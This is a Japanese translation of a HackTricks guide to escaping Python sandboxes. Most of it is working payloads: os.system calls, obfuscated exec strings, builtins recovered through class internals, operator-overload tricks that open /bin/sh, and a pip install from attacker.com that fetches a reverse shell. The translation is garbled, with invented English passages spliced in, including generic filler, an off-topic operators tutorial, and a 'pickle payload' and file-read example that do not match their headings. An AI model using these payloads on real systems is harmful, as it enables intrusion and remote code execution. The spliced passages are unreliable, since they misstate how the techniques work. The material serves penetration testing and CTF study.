# Pythonサンドボックスのバイパス

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できるようにしましょう。Intruderは、攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリやクラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

これらは、Pythonサンドボックスの保護をバイパスし、任意のコマンドを実行するためのトリックです。

## コマンド実行ライブラリ

最初に知るべきことは、すでにインポートされているライブラリでコードを直接実行できるかどうか、またはこれらのライブラリのいずれかをインポートできるかどうかです：
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
_**open**_と_**read**_関数は、Pythonサンドボックス内のファイルを**読み取る**のに役立ち、サンドボックスを**バイパス**するために**実行**できるコードを**書く**のにも役立ちます。

{% hint style="danger" %}
**Python2のinput()**関数は、プログラムがクラッシュする前にPythonコードを実行することができます。
{% endhint %}

Pythonはまず**現在のディレクトリからライブラリを読み込もうとします**（次のコマンドはPythonがモジュールをどこから読み込んでいるかを表示します）：`python3 -c 'import sys; print(sys.path)'`

![](<../../../.gitbook/assets/image (552).png>)

## デフォルトでインストールされているPythonパッケージを使用してpickleサンドボックスをバイパスする

### デフォルトのパッケージ

ここで**事前にインストールされている**パッケージのリストを見つけることができます：[https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
pickleからは、システムにインストールされている**任意のライブラリ**をPython環境にインポートすることができます。\
たとえば、次のpickleは、ロードされるとpipライブラリをインポートして使用します：
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
詳細なpickleの動作については、[https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)を参照してください。

### Pipパッケージ

**@isHaacK**さんが共有したトリック

`pip`または`pip.main()`にアクセスできる場合、任意のパッケージをインストールし、以下のコマンドを呼び出すことで逆シェルを取得することができます。
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
リバースシェルを作成するためのパッケージはこちらからダウンロードできます。使用する前に、**解凍し、`setup.py`を変更し、リバースシェルのためのIPアドレスを設定してください**：

{% file src="../../../.gitbook/assets/reverse.tar.gz" %}

{% hint style="info" %}
このパッケージは「リバース」と呼ばれていますが、リバースシェルを終了すると、インストールの残りの部分が失敗するように特別に作成されています。したがって、サーバーに余分なPythonパッケージがインストールされたままになることはありません。
{% endhint %}

## Pythonコードの評価

{% hint style="warning" %}
execは複数行の文字列と";"を許可しますが、evalは許可しません（ウォルラス演算子を確認してください）
{% endhint %}

特定の文字が禁止されている場合、制限を**バイパス**するために**16進数/8進数/B64**表現を使用できます。
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### Pythonコードを評価するための他のライブラリ

There are several other libraries that allow you to evaluate Python code. Here are some examples:

- **`exec` function**: The `exec` function in Python allows you to execute dynamically created Python code. It takes a string as input and executes it as Python code.

- **`eval` function**: The `eval` function is similar to the `exec` function, but it evaluates a single expression and returns the result.

- **`ast` module**: The `ast` module provides a way to work with the abstract syntax tree (AST) of Python code. It allows you to parse and manipulate Python code at a higher level of abstraction.

- **`compile` function**: The `compile` function compiles Python code into bytecode, which can then be executed by the Python interpreter.

- **`code` module**: The `code` module provides a way to interactively execute Python code. It allows you to create a Python code object and execute it in a controlled environment.

These libraries can be used to evaluate Python code in a controlled manner, but they should be used with caution as they can introduce security risks if not properly handled.
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
## 演算子とショートトリック

### Logical Operators

### 論理演算子

Logical operators are used to combine multiple conditions and evaluate the result as either `True` or `False`. The following are the logical operators in Python:

論理演算子は、複数の条件を組み合わせて、結果を `True` または `False` として評価するために使用されます。以下はPythonで使用される論理演算子です。

- `and`: Returns `True` if both conditions are `True`.
- `and`: 両方の条件が `True` の場合、`True` を返します。

- `or`: Returns `True` if at least one condition is `True`.
- `or`: 少なくとも1つの条件が `True` の場合、`True` を返します。

- `not`: Returns the opposite of the condition.
- `not`: 条件の反対を返します。

### Short Tricks

### ショートトリック

Python provides some short tricks that can be used to simplify code and achieve the desired result more efficiently. Here are a few examples:

Pythonには、コードを簡素化し、効率的に目的の結果を得るために使用できるいくつかのショートトリックがあります。以下にいくつかの例を示します。

- `a if condition else b`: This is a shorthand way of writing an `if-else` statement. If the condition is `True`, it returns `a`; otherwise, it returns `b`.
- `a if condition else b`: これは `if-else` 文を短縮して書く方法です。条件が `True` の場合、`a` を返し、それ以外の場合は `b` を返します。

- `x = y = z = 0`: This assigns the value `0` to all three variables `x`, `y`, and `z` in a single line.
- `x = y = z = 0`: これは、1行で変数 `x`、`y`、`z` の値をすべて `0` に割り当てるものです。

- `a, b = b, a`: This swaps the values of `a` and `b` without using a temporary variable.
- `a, b = b, a`: これは、一時変数を使用せずに `a` と `b` の値を交換します。

- `x = 1 if condition else 0`: This assigns the value `1` to `x` if the condition is `True`; otherwise, it assigns `0`.
- `x = 1 if condition else 0`: 条件が `True` の場合、`x` に値 `1` を割り当てます。それ以外の場合は、`0` を割り当てます。

These short tricks can help in writing concise and efficient code in Python.

これらのショートトリックは、Pythonで簡潔で効率的なコードを書くのに役立ちます。
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## 保護を回避するためのエンコーディング（UTF-7）

[**この解説記事**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)では、UTF-7を使用して、見かけ上のサンドボックス内で任意のPythonコードを読み込み実行します。
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
他のエンコーディング（例：`raw_unicode_escape`と`unicode_escape`）を使用して回避することも可能です。

## 呼び出しを使用せずにPythonを実行する

**呼び出しを許可しない**Pythonのジェイル内にいる場合でも、任意の関数、コード、およびコマンドを**実行**するためのいくつかの方法があります。

### [デコレータ](https://docs.python.org/3/glossary.html#term-decorator)を使用したRCE
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### RCEオブジェクトの作成とオーバーロード

もし、**クラスを宣言**し、そのクラスの**オブジェクトを作成**することができれば、直接呼び出すことなく、**異なるメソッドを書き換え**て、それらを**トリガー**することができます。

#### カスタムクラスによるRCE

既存のクラスメソッドを**上書き**するか、新しいクラスを作成することで、**トリガー**されたときに**任意のコードを実行**するように、いくつかの**クラスメソッド**を変更することができます。
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### [メタクラス](https://docs.python.org/3/reference/datamodel.html#metaclasses)を使用してオブジェクトを作成する

メタクラスを使用することで、コンストラクタを直接呼び出さずにクラスのインスタンスを作成することができます。これは、ターゲットクラスをメタクラスとして持つ新しいクラスを作成することによって実現されます。
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### 例外を使用してオブジェクトを作成する

**例外が発生すると**、**Exception**のオブジェクトが直接コンストラクタを呼び出す必要なく**作成**されます（[**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)のトリック）。
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### より多くのRCE

In this section, we will explore additional methods to achieve Remote Code Execution (RCE) by bypassing Python sandboxes. These techniques can be used to execute arbitrary code on a target system, even if it is protected by a sandbox environment.

#### 1. Code Injection

Code injection involves injecting malicious code into a vulnerable application to execute arbitrary commands. This can be achieved by exploiting vulnerabilities such as command injection, SQL injection, or OS command injection.

#### 2. Dynamic Code Execution

Dynamic code execution involves executing code dynamically at runtime. This can be done by using the `exec()` or `eval()` functions in Python. By crafting malicious code and passing it to these functions, an attacker can execute arbitrary commands.

#### 3. Deserialization Attacks

Deserialization attacks involve exploiting vulnerabilities in the deserialization process of an application. By manipulating serialized data, an attacker can execute arbitrary code during the deserialization process.

#### 4. Module Import Attacks

Module import attacks involve exploiting vulnerabilities in the way modules are imported in Python. By manipulating the import process, an attacker can execute arbitrary code during the module import.

#### 5. Sandbox Escape

Sandbox escape techniques involve bypassing the restrictions imposed by a sandbox environment. This can be achieved by exploiting vulnerabilities in the sandbox implementation or by leveraging weaknesses in the underlying system.

#### 6. Metasploit Framework

The Metasploit Framework is a powerful tool that can be used to exploit vulnerabilities and achieve RCE. It provides a wide range of exploits and payloads that can be used to target Python applications.

By understanding and utilizing these techniques, an attacker can bypass Python sandboxes and gain unauthorized access to a target system. It is important to note that these techniques should only be used for ethical purposes, such as penetration testing or security research.
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### ビルトインの`help`と`license`を使用してファイルを読み取る

Pythonのビルトイン関数である`help`と`license`を使用することで、ファイルを読み取ることができます。

```python
# ファイルを読み取る関数
def read_file(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
        return content

# ファイルのパス
file_path = '/path/to/file.txt'

# ファイルを読み取る
file_content = read_file(file_path)

# ファイルの内容を表示する
print(file_content)
```

このコードでは、`read_file`という関数を定義しています。この関数は、指定されたファイルパスを使用してファイルを開き、その内容を読み取ります。`with open(file_path, 'r') as file:`の行では、`open`関数を使用してファイルを開き、`file`という名前のファイルオブジェクトを作成しています。`'r'`は読み取りモードを表しています。`file.read()`は、ファイルの内容を読み取ります。最後に、`content`変数にファイルの内容を代入し、`return`文で返します。

このコードを使用すると、指定されたファイルの内容を表示することができます。ファイルのパスを`file_path`変数に指定し、`read_file`関数を呼び出すことで、ファイルの内容を取得できます。

注意: ファイルの読み取りには適切な権限が必要です。また、ファイルパスは正確に指定する必要があります。
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できるようにしましょう。Intruderは、攻撃対象を追跡し、予防的な脅威スキャンを実行し、APIからWebアプリやクラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 組み込み関数

* [**Python2の組み込み関数**](https://docs.python.org/2/library/functions.html)
* [**Python3の組み込み関数**](https://docs.python.org/3/library/functions.html)

**`__builtins__`** オブジェクトにアクセスできる場合、ライブラリをインポートすることができます（最後のセクションで示されている他の文字列表現を使用することもできます）。
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### ビルトインなし

`__builtins__`がない場合、**すべてのグローバル関数**（`open`、`import`、`print`など）が**ロードされないため**、何もインポートしたりファイルを読み書きしたりすることはできません。\
ただし、**デフォルトではPythonは多くのモジュールをメモリにインポート**します。これらのモジュールは無害に見えるかもしれませんが、その中には**危険な機能をインポート**しているものもあり、それらにアクセスして**任意のコードを実行**することができます。

以下の例では、これらの「**無害**」なモジュールを**乱用**して、それらの中にある**危険な機能**に**アクセス**する方法を示しています。

**Python2**
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### Python3

Python3 is a powerful programming language that is widely used for various purposes, including web development, data analysis, and automation. It provides a rich set of libraries and frameworks that make it easy to develop complex applications.

However, Python3 also has a feature called "sandboxing" that is designed to restrict the execution of potentially malicious code. Sandboxing is commonly used in cloud/SaaS platforms to provide a secure environment for running untrusted code.

In this guide, we will explore techniques to bypass Python3 sandboxes and execute arbitrary code. These techniques can be useful for penetration testers and security researchers to identify vulnerabilities in sandboxed environments.

**Disclaimer: This guide is for educational purposes only. Hacking into systems without proper authorization is illegal. Always obtain permission before conducting any security testing.**

### Table of Contents

- [Introduction to Python3 Sandboxing](#introduction-to-python3-sandboxing)
- [Bypassing Python3 Sandboxes](#bypassing-python3-sandboxes)
  - [1. Exploiting Vulnerabilities](#1-exploiting-vulnerabilities)
  - [2. Breaking Out of the Sandbox](#2-breaking-out-of-the-sandbox)
  - [3. Evading Detection](#3-evading-detection)
- [Conclusion](#conclusion)

### Introduction to Python3 Sandboxing

Python3 sandboxes are designed to provide a controlled environment for executing untrusted code. They achieve this by restricting access to certain resources and limiting the execution capabilities of the code.

Some common techniques used in Python3 sandboxes include:

- **Code Isolation**: The sandboxed code runs in a separate process or thread, isolated from the main application.
- **Restricted Built-ins**: Certain built-in functions and modules are disabled or restricted to prevent unauthorized access.
- **Resource Limitations**: The sandboxed code is subject to resource limitations, such as CPU usage, memory usage, and file system access.
- **Whitelisting**: Only a predefined set of modules and functions are allowed to be imported and executed.

Despite these security measures, Python3 sandboxes are not foolproof and can be bypassed using various techniques. In the following sections, we will explore some of these techniques in detail.

### Bypassing Python3 Sandboxes

#### 1. Exploiting Vulnerabilities

One way to bypass Python3 sandboxes is by exploiting vulnerabilities in the sandboxing implementation itself. Sandboxing techniques are not perfect and may have flaws that can be exploited to gain unauthorized access.

Common vulnerabilities in Python3 sandboxes include:

- **Privilege Escalation**: Exploiting a vulnerability to gain higher privileges within the sandboxed environment.
- **Code Injection**: Injecting malicious code into the sandboxed environment to execute arbitrary commands.
- **Memory Corruption**: Exploiting memory corruption vulnerabilities to bypass security checks and gain unauthorized access.

To exploit these vulnerabilities, an attacker needs to identify and understand the specific sandboxing implementation being used. This requires knowledge of the underlying technologies and techniques used in the sandbox.

#### 2. Breaking Out of the Sandbox

Another technique to bypass Python3 sandboxes is by breaking out of the sandboxed environment and gaining access to the underlying system. This can be achieved by exploiting vulnerabilities in the sandboxing implementation or by leveraging other techniques such as:

- **Process Escalation**: Exploiting vulnerabilities in the sandboxed process to gain higher privileges or escape the sandboxed environment.
- **File System Manipulation**: Manipulating the file system to gain access to restricted files or execute arbitrary commands.
- **Network Exploitation**: Exploiting network vulnerabilities to gain unauthorized access to external systems.

Breaking out of the sandbox requires a deep understanding of the sandboxing implementation and the underlying system. It often involves a combination of different techniques and may require multiple steps to achieve the desired outcome.

#### 3. Evading Detection

In addition to exploiting vulnerabilities and breaking out of the sandbox, attackers can also use techniques to evade detection by the sandboxing system. This involves bypassing security checks and hiding malicious activities from the sandbox.

Some common techniques for evading detection in Python3 sandboxes include:

- **Code Obfuscation**: Modifying the code to make it difficult to analyze and understand.
- **Anti-Analysis Techniques**: Using techniques to detect and evade analysis tools and techniques used by the sandbox.
- **Dynamic Code Generation**: Generating code dynamically at runtime to avoid static analysis and detection.

By evading detection, attackers can execute malicious code without triggering any alarms or security measures. This can allow them to perform unauthorized actions and gain access to sensitive information.

### Conclusion

Python3 sandboxes provide a controlled environment for executing untrusted code, but they are not foolproof. By exploiting vulnerabilities, breaking out of the sandbox, and evading detection, attackers can bypass Python3 sandboxes and execute arbitrary code.

As security professionals, it is important to understand these techniques and vulnerabilities to better protect our systems. By identifying and patching these vulnerabilities, we can improve the security of our sandboxing implementations and prevent unauthorized access.
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
print.__self__
dir.__self__
globals.__self__
len.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**以下には、**](./#recursive-search-of-builtins-globals) **builtins** を見つけることができる**数十**/**数百**の**場所**がある大きな関数があります。

#### Python2とPython3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### ビルトインペイロード

The following payloads utilize built-in Python functions and modules to bypass Python sandboxes.

以下のペイロードは、Pythonのビルトイン関数やモジュールを利用してPythonのサンドボックスをバイパスします。

#### `__import__` payload

This payload uses the `__import__` function to import a module and execute arbitrary code.

このペイロードは、`__import__`関数を使用してモジュールをインポートし、任意のコードを実行します。

```python
__import__('os').system('command')
```

Replace `'command'` with the desired command to execute.

`'command'`を実行したいコマンドに置き換えてください。

#### `eval` payload

This payload uses the `eval` function to evaluate arbitrary code.

このペイロードは、`eval`関数を使用して任意のコードを評価します。

```python
eval("__import__('os').system('command')")
```

Replace `'command'` with the desired command to execute.

`'command'`を実行したいコマンドに置き換えてください。

#### `exec` payload

This payload uses the `exec` function to execute arbitrary code.

このペイロードは、`exec`関数を使用して任意のコードを実行します。

```python
exec("__import__('os').system('command')")
```

Replace `'command'` with the desired command to execute.

`'command'`を実行したいコマンドに置き換えてください。

#### `compile` payload

This payload uses the `compile` function to compile arbitrary code and then execute it.

このペイロードは、`compile`関数を使用して任意のコードをコンパイルし、それを実行します。

```python
code = compile("__import__('os').system('command')", '<string>', 'exec')
exec(code)
```

Replace `'command'` with the desired command to execute.

`'command'`を実行したいコマンドに置き換えてください。

#### `execfile` payload

This payload uses the `execfile` function to execute code from a file.

このペイロードは、`execfile`関数を使用してファイルからコードを実行します。

```python
execfile('filename')
```

Replace `'filename'` with the name of the file containing the code to execute.

`'filename'`を実行するコードが含まれているファイルの名前に置き換えてください。

#### `pickle` payload

This payload uses the `pickle` module to execute arbitrary code.

このペイロードは、`pickle`モジュールを使用して任意のコードを実行します。

```python
import pickle

payload = "command"
pickled_payload = pickle.dumps(payload)
pickle.loads(pickled_payload)
```

Replace `"command"` with the desired command to execute.

`"command"`を実行したいコマンドに置き換えてください。
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## グローバル変数とローカル変数

**`globals`**と**`locals`**をチェックすることは、アクセスできるものを知るための良い方法です。
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
